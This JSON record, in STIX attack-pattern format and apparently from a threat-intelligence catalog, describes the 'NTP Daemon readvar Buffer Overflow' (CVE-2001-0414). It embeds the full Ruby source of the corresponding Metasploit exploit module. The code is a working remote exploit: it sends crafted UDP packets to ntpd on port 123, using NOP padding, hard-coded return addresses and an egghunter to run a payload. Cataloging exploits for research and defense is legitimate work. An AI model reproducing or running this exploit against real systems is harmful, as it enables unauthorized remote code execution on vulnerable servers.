{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cadaf73b-06ec-4c11-91a2-8122db14c9f5",
    "created": "2024-08-14T17:07:02.905058Z",
    "modified": "2024-08-14T17:07:02.905065Z",
    "name": "NTP Daemon readvar Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in the ntpd and xntpd service. By sending an overly long 'readvar' request it is possible to execute code remotely. As the stack is corrupted, this module uses the Egghunter technique. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/ntp/ntp_overflow.rb",
            "external_id": "ntp_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-0414"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NTP Daemon readvar Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack based buffer overflow in the\n        ntpd and xntpd service. By sending an overly long 'readvar'\n        request it is possible to execute code remotely. As the stack\n        is corrupted, this module uses the Egghunter technique.\n      },\n      'Author'         => 'aushack',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n            [ 'CVE', '2001-0414' ],\n            [ 'OSVDB', '805' ],\n            [ 'BID', '2540' ],\n            [ 'US-CERT-VU', '970472' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 220,\n          'BadChars' => \"\\x00\\x01\\x02\\x16,=\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => Metasm::Shellcode.assemble(Metasm::Ia32.new, \"xor eax,eax mov al,27 int 0x80\").encode_string, # alarm(0)\n          'Compat'   =>\n          {\n            'ConnectionType' => '-reverse',\n          },\n        },\n      'Platform'       => [ 'linux' ],\n      'Arch'\t\t => [ ARCH_X86 ],\n      'Targets'        =>\n        [\n            [ 'RedHat Linux 7.0 ntpd 4.0.99j', \t\t{ 'Ret' => 0xbffffbb0 } ],\n            [ 'RedHat Linux 7.0 ntpd 4.0.99j w/debug', \t{ 'Ret' => 0xbffff980 } ],\n            [ 'RedHat Linux 7.0 ntpd 4.0.99k', \t\t{ 'Ret' => 0xbffffbb0 } ],\n            #[ 'FreeBSD 4.2-STABLE', \t\t\t{ 'Ret' => 0xbfbff8bc } ],\n            [ 'Debugging', \t\t\t\t\t{ 'Ret' => 0xdeadbeef } ],\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2001-04-04',\n      'DefaultTarget' => 0))\n\n    register_options([Opt::RPORT(123)])\n  end\n\n  def exploit\n\n    hunter  = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n    egg     = hunter[1]\n\n    connect_udp\n\n    pkt1 = \"\\x16\\x02\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x016stratum=\"\n    pkt2 = \"\\x16\\x02\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n    sploit =  pkt1 + make_nops(512 - pkt1.length)\n    sploit[(220 + pkt1.length), 4] = [target['Ret']].pack('V')\n    sploit[(224 + pkt1.length), hunter[0].length] = hunter[0]\n\n    print_status(\"Trying target #{target.name}...\")\n\n    print_status(\"Sending hunter\")\n    udp_sock.put(sploit)\n    select(nil,nil,nil,0.5)\n\n    print_status(\"Sending payload\")\n    udp_sock.put(pkt1 + egg)\n    select(nil,nil,nil,0.5)\n\n    print_status(\"Calling overflow trigger\")\n    udp_sock.put(pkt2)\n    select(nil,nil,nil,0.5)\n\n    handler\n    disconnect_udp\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-04-04",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}